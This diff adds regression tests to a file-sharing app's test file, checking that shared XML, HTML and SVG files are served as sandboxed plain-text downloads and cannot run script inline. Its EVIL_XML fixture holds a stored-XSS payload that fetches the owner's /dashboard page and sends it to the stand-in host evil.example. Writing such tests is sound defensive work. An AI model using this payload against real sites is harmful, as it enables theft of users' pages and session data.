@@ -13,13 +13,33 @@ function withTempDb(): string {
   closeDb();
   const root = mkdtempSync(join(tmpdir(), 'drop-file-render-size-'));
   process.env.DROP_DB = join(root, 'drop.db');
+  // Access logging lazily creates an owner key via saveConfig(); keep it out
+  // of the real user config.
+  process.env.DROP_CONFIG = join(root, 'config.json');
   return root;
 }
 
 afterEach(() => {
   closeDb();
   delete process.env.DROP_DB;
+  delete process.env.DROP_CONFIG;
 });
+
+// An XML document in the XHTML namespace runs its <script> when a browser
+// renders it, on the same origin as the owner-cookied /dashboard.
+const EVIL_XML =
+  '<?xml version="1.0"?>\n<html xmlns="http://www.w3.org/1999/xhtml"><body>' +
+  '<script>fetch("/dashboard").then(r=>r.text()).then(t=>new Image().src="//evil.example/?"+encodeURIComponent(t))</script>' +
+  '</body></html>';
+
+function expectSafeDownload(res: Response) {
+  expect(res.status).toBe(200);
+  const contentType = res.headers.get('content-type') || '';
+  expect(contentType).toStartWith('text/plain');
+  expect(contentType).not.toContain('xml');
+  expect(res.headers.get('content-disposition') || '').toStartWith('attachment');
+  expect(res.headers.get('content-security-policy') || '').toContain('sandbox');
+}
 
 describe('file share size limits and streaming', () => {
   test('an oversized .log file is served raw instead of rendered', async () => {
@@ -298,6 +318,74 @@ describe('file share size limits and streaming', () => {
       const res = await app.fetch(new Request('http://drop.test/f/git-token-for-file-raw-test/raw'));
 
       expect(res.status).toBe(404);
+    } finally {
+      rmSync(root, { recursive: true, force: true });
+    }
+  });
+  test('a shared .xml file requested via the raw route is a sandboxed plain-text download', async () => {
+    const root = withTempDb();
+    try {
+      const file = join(root, 'evil.xml');
+      writeFileSync(file, EVIL_XML);
+
+      const token = addAuthorization(file, 60).token;
+      for (const path of [`/f/${token}/raw`, `/f/${token}/evil.xml`]) {
+        const res = await app.fetch(new Request(`http://drop.test${path}`));
+        if (path.endsWith('/raw')) {
+          expectSafeDownload(res);
+          expect(await res.text()).toBe(EVIL_XML); // bytes unchanged, just not executable inline
+        } else {
+          // Small XML renders as an escaped code page; it must never be the raw document.
+          expect(res.headers.get('content-type') || '').not.toContain('xml');
+        }
+      }
+    } finally {
+      rmSync(root, { recursive: true, force: true });
+    }
+  });
+
+  test('a large .xml file falling back to raw via the page route is a sandboxed plain-text download', async () => {
+    const root = withTempDb();
+    try {
+      const file = join(root, 'big.xml');
+      const filler = '<!-- ' + 'x'.repeat(1024) + ' -->\n';
+      writeFileSync(file, EVIL_XML + filler.repeat(Math.ceil((MAX_RENDER_SIZE + 1024 * 1024) / filler.length)));
+
+      const token = addAuthorization(file, 60).token;
+      const res = await app.fetch(new Request(`http://drop.test/f/${token}`));
+      expectSafeDownload(res);
+    } finally {
+      rmSync(root, { recursive: true, force: true });
+    }
+  });
+
+  test('the raw route serves .html and .svg with a sandbox CSP as well', async () => {
+    const root = withTempDb();
+    try {
+      for (const [name, body] of [['evil.html', '<script>1</script>'], ['evil.svg', '<svg onload="1"></svg>']]) {
+        const file = join(root, name);
+        writeFileSync(file, body);
+        const token = addAuthorization(file, 60).token;
+        expectSafeDownload(await app.fetch(new Request(`http://drop.test/f/${token}/raw`)));
+      }
+    } finally {
+      rmSync(root, { recursive: true, force: true });
+    }
+  });
+
+  test('a shared .docx is served with its Office type as an attachment', async () => {
+    const root = withTempDb();
+    try {
+      const file = join(root, 'report.docx');
+      writeFileSync(file, Buffer.from('PK\x03\x04 fake docx'));
+
+      const token = addAuthorization(file, 60).token;
+      for (const path of [`/f/${token}`, `/f/${token}/raw`]) {
+        const res = await app.fetch(new Request(`http://drop.test${path}`));
+        expect(res.status).toBe(200);
+        expect(res.headers.get('content-type')).toBe('application/vnd.openxmlformats-officedocument.wordprocessingml.document');
+        expect(res.headers.get('content-disposition') || '').toStartWith('attachment');
+      }
     } finally {
       rmSync(root, { recursive: true, force: true });
     }
